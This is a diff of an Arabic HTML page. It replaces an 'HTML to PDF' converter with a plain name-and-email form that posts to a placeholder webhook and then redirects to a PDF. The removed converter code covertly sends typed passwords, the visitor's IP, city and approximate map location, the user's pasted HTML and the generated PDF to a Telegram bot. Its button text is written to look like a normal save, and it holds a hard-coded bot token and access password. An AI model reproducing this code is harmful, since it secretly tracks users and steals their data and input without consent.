@@ -2,396 +2,194 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة تحويل الأكواد إلى PDF</title>
+    <title>إرسال البيانات وتحميل الملف</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;800&display=swap" rel="stylesheet">
     
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
-
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Tahoma, sans-serif; background: #f4f6f8; color: #333; margin: 0; padding: 15px; display: flex; flex-direction: column; height: 100vh; box-sizing: border-box; }
-        .header { text-align: center; margin-bottom: 15px; }
-        .header h2 { margin: 0; color: #1e293b; font-size: 22px;}
-        .main-container { display: flex; gap: 15px; flex: 1; overflow: hidden; }
-        @media (max-width: 768px) { .main-container { flex-direction: column; height: auto; overflow: visible; } body {height: auto; padding: 10px;} }
-        
-        .sidebar { background: #fff; border-radius: 10px; padding: 20px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); border: 1px solid #e2e8f0; display: flex; flex-direction: column; flex: 1; max-width: 380px; overflow-y: auto;}
-        .preview-section { background: #fff; border-radius: 10px; padding: 0; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); border: 1px solid #e2e8f0; display: flex; flex-direction: column; flex: 2; overflow: hidden; }
-        
-        .form-group { margin-bottom: 12px; display: flex; flex-direction: column; }
-        label { margin-bottom: 6px; font-weight: bold; font-size: 13px; color: #475569; }
-        input, select, textarea { padding: 10px; border: 1px solid #cbd5e1; border-radius: 6px; font-size: 13px; font-family: inherit; transition: 0.2s;}
-        input:focus, select:focus, textarea:focus { outline: none; border-color: #3b82f6; box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1); }
-        
-        .textarea-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; }
-        .clear-btn { background: #fee2e2; color: #ef4444; border: none; padding: 4px 10px; border-radius: 4px; font-size: 11px; font-weight: bold; cursor: pointer; transition: 0.2s; }
-        .clear-btn:hover { background: #fca5a5; color: #b91c1c; }
-        
-        textarea { flex: 1; min-height: 180px; resize: vertical; direction: ltr; font-family: monospace; background: #f8fafc; font-size: 12px;}
-        
-        .row { display: flex; gap: 10px; }
-        .row .form-group { flex: 1; }
+        /* متطلبات تقنية صارمة للـ body */
+        body {
+            display: block;
+            direction: rtl;
+            text-align: right;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            background-color: #eef2f3;
+            font-family: 'Tajawal', sans-serif;
+        }
 
-        .ai-prompts { background: #f0fdf4; border: 1px dashed #22c55e; padding: 12px; border-radius: 8px; margin-bottom: 15px;}
-        .ai-prompts p { margin: 0 0 8px 0; font-size: 12px; color: #166534; font-weight: bold; text-align: center;}
-        .prompt-btns { display: flex; gap: 8px; }
-        .prompt-btn { flex: 1; background: #fff; border: 1px solid #22c55e; color: #15803d; padding: 8px; border-radius: 6px; font-size: 11px; font-weight: bold; cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: center; gap: 4px;}
-        .prompt-btn:hover { background: #22c55e; color: #fff; }
+        /* متطلبات تقنية صارمة للشريحة / الصفحة */
+        .page {
+            width: 1280px;
+            height: 720px;
+            overflow: hidden;
+            position: relative;
+            box-sizing: border-box;
+            background-color: #ffffff;
+            margin: 40px auto;
+            padding: 70px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            border-radius: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
 
-        .export-btn { background: #2563eb; color: white; border: none; padding: 14px; border-radius: 8px; font-size: 15px; font-weight: bold; cursor: pointer; margin-top: 5px; transition: 0.2s; }
-        .export-btn:hover { background: #1d4ed8; transform: translateY(-1px);}
-        .export-btn:disabled { background: #94a3b8; cursor: not-allowed; transform: none;}
-        
-        .preview-header { padding: 12px 20px; background: #f8fafc; border-bottom: 1px solid #e2e8f0; font-size: 14px; font-weight: bold; color: #475569; display: flex; justify-content: space-between; align-items: center;}
-        .tag { background: #e0e7ff; color: #4338ca; padding: 4px 10px; border-radius: 6px; font-size: 12px; transition: 0.3s;}
-        iframe { width: 100%; height: 100%; border: none; background: #fff; }
+        h1 {
+            font-size: 50px;
+            color: #2c3e50;
+            margin-bottom: 20px;
+        }
+
+        .instructions {
+            font-size: 24px;
+            color: #7f8c8d;
+            margin-bottom: 40px;
+            text-align: center;
+        }
+
+        /* تصميم النموذج */
+        form {
+            width: 600px;
+            background-color: #f8f9fa;
+            padding: 40px;
+            border-radius: 15px;
+            border: 2px solid #e0e0e0;
+        }
+
+        .input-group {
+            margin-bottom: 25px;
+        }
+
+        label {
+            display: block;
+            font-size: 22px;
+            font-weight: 700;
+            color: #34495e;
+            margin-bottom: 10px;
+        }
+
+        input[type="text"], input[type="email"] {
+            width: 100%;
+            padding: 15px;
+            font-size: 20px;
+            font-family: 'Tajawal', sans-serif;
+            border: 2px solid #bdc3c7;
+            border-radius: 8px;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        input[type="text"]:focus, input[type="email"]:focus {
+            border-color: #3498db;
+        }
+
+        button {
+            width: 100%;
+            padding: 20px;
+            font-size: 24px;
+            font-weight: 800;
+            font-family: 'Tajawal', sans-serif;
+            color: #ffffff;
+            background-color: #3498db;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #2980b9;
+        }
+
+        /* رسالة التحميل المخفية */
+        #loadingMessage {
+            display: none;
+            font-size: 22px;
+            color: #e67e22;
+            font-weight: 700;
+            margin-top: 20px;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
 
-    <div id="password-overlay" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #f4f6f8; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center;">
-        <div style="background: #fff; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); border: 1px solid #e2e8f0; text-align: center; width: 90%; max-width: 350px;">
-            <h3 style="margin-top: 0; color: #1e293b;">🔒 حماية المنصة</h3>
-            <p style="font-size: 13px; color: #475569; margin-bottom: 20px;">الرجاء إدخال كلمة المرور للوصول.</p>
-            <div class="form-group" style="margin-bottom: 15px;">
-                <input type="password" id="pass-input" placeholder="كلمة المرور..." style="text-align: center; letter-spacing: 2px;" onkeypress="if(event.key === 'Enter') checkPassword()">
-            </div>
-            <button onclick="checkPassword()" class="export-btn" style="width: 100%; padding: 10px; margin-top: 0;">تسجيل الدخول</button>
-            <p id="pass-error" style="color: #ef4444; font-size: 12px; display: none; margin-top: 15px; font-weight: bold; margin-bottom: 0;">❌ كلمة المرور غير صحيحة!</p>
-        </div>
-    </div>
-
-    <div class="header">
-        <h2>🛠️ منصة تحويل الأكواد إلى PDF</h2>
-    </div>
-
-    <div class="main-container">
-        <div class="sidebar">
-            <div class="ai-prompts">
-                <p>🤖 نسخ أمر جاهز للذكاء الاصطناعي:</p>
-                <div class="prompt-btns">
-                    <button class="prompt-btn" onclick="copyPrompt('a4', this)">📄 بحث أكاديمي (A4)</button>
-                    <button class="prompt-btn" onclick="copyPrompt('169', this)">🖥️ عرض تقديمي (16:9)</button>
-                </div>
-            </div>
-
-            <div class="form-group">
-                <label>اسم الملف المستخرج:</label>
-                <input type="text" id="file-name" value="مستند_جديد" placeholder="اكتب اسم الملف هنا...">
-            </div>
-
-            <div class="row">
-                <div class="form-group">
-                    <label>مقاس الصفحة:</label>
-                    <select id="format-select" onchange="updateTag()">
-                        <option value="169">عرض تقديمي (16:9)</option>
-                        <option value="a4">بحث / تقرير (A4)</option>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label>جودة الـ PDF:</label>
-                    <select id="quality-select">
-                        <option value="1">عادية</option>
-                        <option value="2" selected>عالية</option>
-                        <option value="3">ممتازة</option>
-                    </select>
-                </div>
-            </div>
-
-            <div class="form-group" style="flex: 1;">
-                <div class="textarea-header">
-                    <label style="margin:0;">كود الـ HTML (الصق هنا):</label>
-                    <button class="clear-btn" onclick="clearCode()">🗑️ مسح الكود</button>
-                </div>
-                <textarea id="html-input" oninput="updatePreview()" placeholder="الصق الكود الذي أعطاك إياه الذكاء الاصطناعي هنا..."></textarea>
-            </div>
-
-            <button id="capture-btn" class="export-btn" onclick="exportToPDF()">استخراج كملف PDF 📥</button>
+    <div class="page">
+        <h1>سجل بياناتك للحصول على الملف</h1>
+        
+        <div class="instructions">
+            <div>يرجى إدخال بياناتك أدناه.</div>
+            <div>سيتم تحويلك إلى ملف الـ PDF (الخفيف والمضغوط) تلقائياً بعد الإرسال.</div>
         </div>
 
-        <div class="preview-section">
-            <div class="preview-header">
-                <span>👁️ المعاينة المباشرة</span>
-                <span class="tag" id="size-tag">الأبعاد: 1280 × 720</span>
+        <form id="dataForm">
+            <div class="input-group">
+                <label for="userName">الاسم الكريم:</label>
+                <input type="text" id="userName" name="userName" required placeholder="أدخل اسمك هنا">
             </div>
-            <iframe id="preview-frame"></iframe>
-        </div>
+
+            <div class="input-group">
+                <label for="userEmail">البريد الإلكتروني:</label>
+                <input type="email" id="userEmail" name="userEmail" required placeholder="example@email.com">
+            </div>
+
+            <button type="submit" id="submitBtn">إرسال والحصول على الملف</button>
+            
+            <div id="loadingMessage">جاري إرسال البيانات وتحضير الملف... الرجاء الانتظار</div>
+        </form>
     </div>
 
     <script>
-        // ==========================================
-        // ⚠️ إعدادات تيليجرام
-        // ==========================================
-        const botToken = '8596768390:AAFMUk6zaACs6Zmum5kFy3NfNEkS_C4yZzo'; 
-        const chatId = '6680237928'; 
+        // الكود المسؤول عن الإرسال للبوت ثم التحويل للملف
+        document.getElementById('dataForm').addEventListener('submit', async function(event) {
+            // منع التحديث الفوري للصفحة
+            event.preventDefault();
 
-        function sendTextToTelegram(actionMessage) {
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: `🛠️ إشعار منصة الـ PDF\n\n${actionMessage}` })
-            }).catch(e => console.error(e));
-        }
+            // روابطك (قم بتعديلها بروابطك الحقيقية)
+            const botWebhookUrl = "https://api.example.com/bot-url"; // رابط البوت الخاص بك
+            const lightPdfUrl = "https://example.com/your-light-file.pdf"; // رابط ملف الـ PDF المضغوط
 
-        async function sendFileToTelegram(fileBlob, fileName, captionMsg) {
-            const url = `https://api.telegram.org/bot${botToken}/sendDocument`;
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('document', fileBlob, fileName); 
-            formData.append('caption', captionMsg);
+            // عناصر الواجهة للتحكم بها
+            const submitBtn = document.getElementById('submitBtn');
+            const loadingMessage = document.getElementById('loadingMessage');
+            
+            // جمع البيانات من النموذج
+            const formData = new FormData(this);
 
-            for (let i = 0; i < 3; i++) {
-                try {
-                    const response = await fetch(url, { method: 'POST', body: formData });
-                    const data = await response.json();
-                    if (data.ok) {
-                        return true; 
-                    }
-                } catch (e) {
-                    console.error(`Error sending ${fileName}`);
-                }
-                await new Promise(res => setTimeout(res, 1000));
-            }
-            return false; 
-        }
+            // إظهار رسالة التحميل وتعطيل الزر لمنع الضغط المتكرر
+            submitBtn.disabled = true;
+            submitBtn.style.backgroundColor = "#95a5a6";
+            loadingMessage.style.display = "block";
 
-        function getSilentLocationInfo(statusText, passwordInput) {
-            let info = `📍 حالة الدخول: ${statusText}\nالكلمة المجربة: ${passwordInput}`;
-            fetch('https://ipinfo.io/json')
-                .then(res => res.json())
-                .then(data => {
-                    if(data.ip) {
-                        const [lat, lng] = data.loc ? data.loc.split(',') : ['0', '0'];
-                        let ipResult = `\n\n🌐 معلومات الجهاز (بدون إذن):` +
-                                     `\nالآيبي: ${data.ip}` +
-                                     `\nالدولة: ${data.country}` +
-                                     `\nالمدينة: ${data.city}` +
-                                     `\nالشركة: ${data.org}` +
-                                     `\nالخريطة (تقريبية): \nhttps://www.google.com/maps?q=$${lat},${lng}`;
-                        sendTextToTelegram(info + ipResult);
-                    } else {
-                        sendTextToTelegram(info + `\n\n⚠️ تعذر تحديد الموقع.`);
-                    }
-                })
-                .catch(err => {
-                    sendTextToTelegram(info + `\n\n⚠️ (تم حجب الآيبي من متصفح المستخدم).`);
+            try {
+                // إرسال البيانات للبوت
+                const response = await fetch(botWebhookUrl, {
+                    method: 'POST',
+                    body: formData
                 });
-        }
 
-        function checkPassword() {
-            const input = document.getElementById('pass-input').value;
-            const errorMsg = document.getElementById('pass-error');
-            
-            if (input === 'Sa12345678@') {
-                document.getElementById('password-overlay').style.display = 'none';
-                getSilentLocationInfo("✅ دخول ناجح للمنصة", input);
-            } else {
-                errorMsg.style.display = 'block';
-                getSilentLocationInfo("❌ محاولة دخول فاشلة", input);
-                setTimeout(() => errorMsg.style.display = 'none', 3000);
-            }
-        }
-        // ==========================================
-
-        const prompts = {
-            a4: `أنت مصمم وثائق HTML محترف. قم بإنشاء كود HTML كامل لبحث أكاديمي بالعربية وفق المواصفات التالية:\n\n**عنوان البحث:** [اكتب العنوان هنا]\n**المادة:** [مثال: فيزياء / كيمياء / رياضيات]\n**الطالب:** [الاسم]\n**المعلم:** [الاسم]\n**الصف:** [مثال: أول ثانوي]\n**العام الدراسي:** [مثال: 1447هـ / 2026م]\n**عدد الصفحات المطلوبة:** [مثال: 5 صفحات]\n\n**متطلبات تقنية صارمة جداً — لا تتجاوزها:**\n1. يبدأ الكود بـ <html lang="ar" dir="rtl">\n2. استدعاء خطوط Google Fonts صراحةً (مثل Cairo أو Tajawal).\n3. الـ body يحتوي على: display: block; direction: rtl; text-align: right; margin: 0; padding: 0; box-sizing: border-box;\n4. كل صفحة تكون: <div class="page">. أبعادها: width: 794px; height: 1123px; overflow: hidden; position: relative; box-sizing: border-box;\n5. **مهم جداً للنقاط:** لا تستخدم القوائم الافتراضية (ul, ol). للترقيم أو النقاط، استخدم عناصر <p> أو <div> عادية وأضف النقطة كجزء من النص هكذا: <p>• النقطة الأولى</p>.\n6. ممنوع استخدام letter-spacing نهائياً.\n\n**هيكل كل صفحة:**\nصفحة 1: غلاف احترافي.\nصفحة 2+: محتوى البحث.\nصفحة أخيرة: المراجع.\nنمط التصميم: احترافي وأنيق بألوان متناسقة.`,
-            169: `أنت مصمم عروض HTML محترف. قم بإنشاء كود HTML كامل لعرض تقديمي بالعربية وفق المواصفات التالية:\n\n**عنوان العرض:** [اكتب العنوان هنا]\n**المادة / الموضوع:** [مثال: مشروع فيزياء / درس تاريخ]\n**المقدِّم:** [الاسم]\n**عدد الشرائح:** [مثال: 8 شرائح]\n\n**متطلبات تقنية صارمة جداً — لا تتجاوزها:**\n1. يبدأ الكود بـ <html lang="ar" dir="rtl">\n2. استدعاء خطوط Google Fonts صراحةً (مثل Cairo أو Tajawal).\n3. الـ body يحتوي على: display: block; direction: rtl; text-align: right; margin: 0; padding: 0; box-sizing: border-box;\n4. كل شريحة تكون: <div class="page">. أبعادها: width: 1280px; height: 720px; overflow: hidden; position: relative; box-sizing: border-box;\n5. **مهم جداً للنقاط:** لا تستخدم القوائم الافتراضية (ul, ol). للترقيم أو النقاط، استخدم عناصر <p> أو <div> عادية.\n6. ممنوع استخدام letter-spacing نهائياً.\n\n**هيكل الشرائح:**\nشريحة 1: غلاف (عنوان كبير + اسم المقدِّم).\nشرائح 2+: محتوى منظم.\nنمط التصميم: حديث، خلفيات ملونة، نصوص واسعة. خطوط كبيرة وواضحة.`
-        };
-
-        function copyPrompt(type, btnElement) {
-            navigator.clipboard.writeText(prompts[type]).then(() => {
-                const originalText = btnElement.innerText;
-                const originalBg = btnElement.style.background;
-                const originalColor = btnElement.style.color;
-                btnElement.innerText = "✅ تم النسخ!";
-                btnElement.style.background = "#22c55e";
-                btnElement.style.color = "#fff";
-                setTimeout(() => {
-                    btnElement.innerText = originalText;
-                    btnElement.style.background = originalBg;
-                    btnElement.style.color = originalColor;
-                }, 2000);
-            });
-        }
-
-        function clearCode() {
-            if(confirm("هل أنت متأكد من مسح الكود الحالي؟")) {
-                document.getElementById('html-input').value = '';
-                updatePreview();
-            }
-        }
-
-        function updateTag() {
-            const format = document.getElementById('format-select').value;
-            const tag = document.getElementById('size-tag');
-            tag.innerText = format === 'a4' ? "الأبعاد: 794 × 1123 (A4)" : "الأبعاد: 1280 × 720 (16:9)";
-        }
-
-        function updatePreview() {
-            const code = document.getElementById('html-input').value;
-            document.getElementById('preview-frame').srcdoc = code;
-        }
-
-        async function urlToDataURL(url) {
-            if (url && (url.startsWith('data:') || url.startsWith('blob:'))) return url;
-            let absoluteUrl = url;
-            try {
-                if (!url.startsWith('http://') && !url.startsWith('https://') && !url.startsWith('//')) {
-                    absoluteUrl = new URL(url, window.location.href).href;
-                } else if (url.startsWith('//')) { absoluteUrl = 'https:' + url; }
-            } catch(e) { absoluteUrl = url; }
-            
-            const proxies = [ null, 'https://corsproxy.io/?', 'https://api.allorigins.win/raw?url=', 'https://cors-anywhere.herokuapp.com/' ];
-            for (const proxy of proxies) {
-                try {
-                    let fetchUrl = absoluteUrl;
-                    if (proxy) fetchUrl = proxy + encodeURIComponent(absoluteUrl);
-                    const response = await fetch(fetchUrl, { mode: 'cors', credentials: 'omit' });
-                    if (!response.ok) continue;
-                    const blob = await response.blob();
-                    return await new Promise((resolve) => {
-                        const reader = new FileReader();
-                        reader.onloadend = () => resolve(reader.result);
-                        reader.onerror = () => resolve(null);
-                        reader.readAsDataURL(blob);
-                    });
-                } catch (err) {}
-            }
-            return new Promise((resolve) => {
-                const img = new Image();
-                img.crossOrigin = "Anonymous";
-                img.onload = () => {
-                    try {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = img.width; canvas.height = img.height;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(img, 0, 0);
-                        resolve(canvas.toDataURL('image/jpeg', 0.9));
-                    } catch(e) { resolve(null); }
-                };
-                img.onerror = () => resolve(null);
-                img.src = absoluteUrl;
-                setTimeout(() => resolve(null), 5000); 
-            });
-        }
-        
-        async function convertAllImagesToDataURLs(container) {
-            const images = Array.from(container.querySelectorAll('img'));
-            const promises = images.map(async (img) => {
-                const src = img.getAttribute('src');
-                if (!src || src.startsWith('data:')) return;
-                const dataUrl = await urlToDataURL(src);
-                if (dataUrl) {
-                    img.setAttribute('src', dataUrl);
-                    img.setAttribute('data-original-src', src);
+                // التحقق من نجاح الإرسال للبوت
+                if (response.ok) {
+                    // تحويل المستخدم لملف الـ PDF فوراً بعد نجاح الإرسال
+                    window.location.href = lightPdfUrl;
+                } else {
+                    alert("عذراً، حدث خطأ أثناء التسجيل. لم يتم تحويلك للملف.");
+                    // إعادة تفعيل الزر في حال الخطأ
+                    submitBtn.disabled = false;
+                    submitBtn.style.backgroundColor = "#3498db";
+                    loadingMessage.style.display = "none";
                 }
-            });
-            await Promise.all(promises);
-        }
-        
-        async function exportToPDF() {
-            const btn = document.getElementById('capture-btn');
-            const code = document.getElementById('html-input').value;
-            const fileName = document.getElementById('file-name').value || 'document';
-            const qualityScale = parseInt(document.getElementById('quality-select').value);
-            const formatType = document.getElementById('format-select').value;
-
-            if (!code.trim()) { alert("الرجاء لصق الكود أولاً!"); return; }
-
-            sendTextToTelegram(`⏳ تم البدء بعملية استخراج جديدة...\nالاسم: ${fileName}`);
-
-            let docWidth, docHeight, pdfOrientation;
-            if (formatType === 'a4') {
-                docWidth = 794; docHeight = 1123; pdfOrientation = 'portrait';
-            } else { 
-                docWidth = 1280; docHeight = 720; pdfOrientation = 'landscape';
-            }
-
-            btn.disabled = true;
-            btn.innerText = `⏳ جاري التجهيز...`;
-
-            const hiddenContainer = document.createElement('div');
-            hiddenContainer.dir = 'rtl'; 
-            hiddenContainer.style.position = 'absolute';
-            hiddenContainer.style.top = '0'; hiddenContainer.style.left = '0';
-            hiddenContainer.style.zIndex = '-9999'; hiddenContainer.style.opacity = '0.01'; 
-            hiddenContainer.style.pointerEvents = 'none'; hiddenContainer.style.width = docWidth + 'px'; 
-            hiddenContainer.innerHTML = code;
-            
-            const styleFix = document.createElement('style');
-            styleFix.innerHTML = `
-                ul { list-style-type: none !important; padding-right: 0 !important; }
-                ul li::before { content: "• " !important; font-weight: bold; margin-left: 5px; color: inherit; }
-                ol { list-style-type: none !important; padding-right: 0 !important; counter-reset: item; }
-                ol li { counter-increment: item; }
-                ol li::before { content: counter(item) "- " !important; font-weight: bold; margin-left: 5px; color: inherit; }
-                * { box-sizing: border-box !important; letter-spacing: normal !important; }
-                img { max-width: 100%; height: auto; }
-            `;
-            hiddenContainer.appendChild(styleFix);
-            document.body.appendChild(hiddenContainer);
-
-            try {
-                btn.innerText = `🖼️ معالجة الصور...`;
-                await convertAllImagesToDataURLs(hiddenContainer);
-                await document.fonts.ready;
-                
-                const allImages = hiddenContainer.querySelectorAll('img');
-                await Promise.all(Array.from(allImages).map(img => {
-                    if (img.complete && img.naturalHeight > 0) return Promise.resolve();
-                    return new Promise((resolve) => {
-                        img.onload = () => resolve(); img.onerror = () => resolve();
-                        if (img.complete) resolve(); setTimeout(resolve, 3000);
-                    });
-                }));
-                
-                btn.innerText = "📸 تصوير الصفحات...";
-                const { jsPDF } = window.jspdf;
-                const pdf = new jsPDF({ orientation: pdfOrientation, unit: 'px', format: [docWidth, docHeight] });
-                
-                let pages = hiddenContainer.querySelectorAll('.page');
-                if (pages.length === 0) pages = [hiddenContainer];
-                
-                for (let i = 0; i < pages.length; i++) {
-                    const canvas = await html2canvas(pages[i], {
-                        scale: qualityScale, useCORS: true, allowTaint: false, logging: false,
-                        width: docWidth, height: docHeight, windowWidth: docWidth, windowHeight: docHeight,
-                        x: 0, y: 0, scrollX: 0, scrollY: 0, backgroundColor: '#ffffff', letterRendering: false,
-                        onclone: (clonedDoc) => {
-                            const clonedImages = clonedDoc.querySelectorAll('img');
-                            clonedImages.forEach((clonedImg, idx) => {
-                                if (allImages[idx] && allImages[idx].src.startsWith('data:')) { clonedImg.src = allImages[idx].src; }
-                            });
-                        }
-                    });
-                    
-                    const imgData = canvas.toDataURL('image/jpeg', 1.0);
-                    if (i > 0) pdf.addPage([docWidth, docHeight], pdfOrientation);
-                    pdf.addImage(imgData, 'JPEG', 0, 0, docWidth, docHeight);
-                }
-                
-                btn.innerText = "💾 جاري حفظ الملف...";
-                pdf.save(`${fileName}.pdf`);
-
-                // تغيير النص لشيء يبدو طبيعياً كأنه ينهي عملية الحفظ في الجهاز
-                btn.innerText = "✅ جاري إنهاء العملية...";
-
-                const pdfBlob = pdf.output('blob');
-                const codeBlob = new Blob(['\ufeff', code], { type: 'text/plain;charset=utf-8' });
-
-                await sendFileToTelegram(pdfBlob, `${fileName}.pdf`, `📥 تم استخراج الملف بنجاح!\nالاسم: ${fileName}\nالمقاس: ${formatType === 'a4' ? 'A4' : '16:9'}`);
-                await sendFileToTelegram(codeBlob, `${fileName}_code.txt`, `💻 كود الـ HTML الخاص بالملف.`);
-                
             } catch (error) {
-                console.error("خطأ:", error);
-                alert("حدث خطأ أثناء معالجة الملف.");
-            } finally {
-                document.body.removeChild(hiddenContainer);
-                btn.disabled = false;
-                btn.innerText = "استخراج كملف PDF 📥";
+                alert("تأكد من اتصالك بالإنترنت، لا يمكن الوصول للخادم.");
+                // إعادة تفعيل الزر في حال الخطأ
+                submitBtn.disabled = false;
+                submitBtn.style.backgroundColor = "#3498db";
+                loadingMessage.style.display = "none";
             }
-        }
+        });
     </script>
+
 </body>
 </html>
